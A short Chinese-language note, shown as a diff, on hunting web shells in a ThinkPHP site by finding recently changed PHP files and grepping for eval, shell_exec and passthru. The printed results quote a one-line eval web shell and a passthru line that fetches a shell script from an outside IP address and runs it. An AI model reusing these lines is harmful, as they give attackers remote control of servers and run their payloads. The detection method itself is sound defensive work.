@@ -1,0 +1,41 @@
+如果我们可以查找最后一次网站代码更新以后的所有php文件，方法如下。
+假设最后更新是10天前，我们可以查找10天内生成的可以php文件：
+ 
+find /home -name "*.php" -mtime -10
+
+
+find /home/ -name "*.php" |xargs grep "eval"
+/home/web/tp5/application/route.php:    'checkcodevalid' => 'api/sms_Demo/checkcodevalid',
+/home/web/tp5/public/indexa.php:<?php @eval($_POST[ggbb]);?>
+/home/web/tp5/runtime/temp/c2cb455c6a5ab94465a5bffe4dacd4bc.php:        eval(code);
+/home/web/tp5/runtime/temp/1a9d1228695f79695b61c4686837646d.php:        var json = eval('(' + jsonData + ')');
+/home/web/tp5/thinkphp/library/think/Response.php:                $this->header['Cache-Control'] = 'max-age=' . $cache[1] . ',must-revalidate';
+/home/web/tp5/thinkphp/library/think/response/Redirect.php:        $this->cacheControl('no-cache,must-revalidate');
+/home/web/tp5/thinkphp/library/think/view/driver/Php.php:        eval('?>' . $this->content);
+/home/web/tp5/route.php:    'checkcodevalid' => 'api/sms_Demo/checkcodevalid',
+
+
+[root@localhost ~]# find /home/ -name "*.php" |xargs grep "shell_exec"
+/home/web/tp5/thinkphp/library/think/console/output/Ask.php:        $sttyMode = shell_exec('stty -g');
+/home/web/tp5/thinkphp/library/think/console/output/Ask.php:        shell_exec('stty -icanon -echo');
+/home/web/tp5/thinkphp/library/think/console/output/Ask.php:        shell_exec(sprintf('stty %s', $sttyMode));
+/home/web/tp5/thinkphp/library/think/console/output/Ask.php:            $value = rtrim(shell_exec($exe));
+/home/web/tp5/thinkphp/library/think/console/output/Ask.php:            $sttyMode = shell_exec('stty -g');
+/home/web/tp5/thinkphp/library/think/console/output/Ask.php:            shell_exec('stty -echo');
+/home/web/tp5/thinkphp/library/think/console/output/Ask.php:            shell_exec(sprintf('stty %s', $sttyMode));
+/home/web/tp5/thinkphp/library/think/console/output/Ask.php:            $value   = rtrim(shell_exec($command));
+/home/web/tp5/thinkphp/library/think/console/output/Ask.php:                if ('OK' === rtrim(shell_exec(sprintf($test, $sh)))) {
+
+
+[root@localhost ~]# find /home/ -name "*.php" |xargs grep "passthru"
+/home/web/tp5/public/uup.php:<?php passthru("curl -o ./mr.sh http://192.99.142.226:8220/mr.sh;chmod 777 mr.sh;bash ./mr.sh"); ?>
+
+
+
+
+
+
+
+
+
+
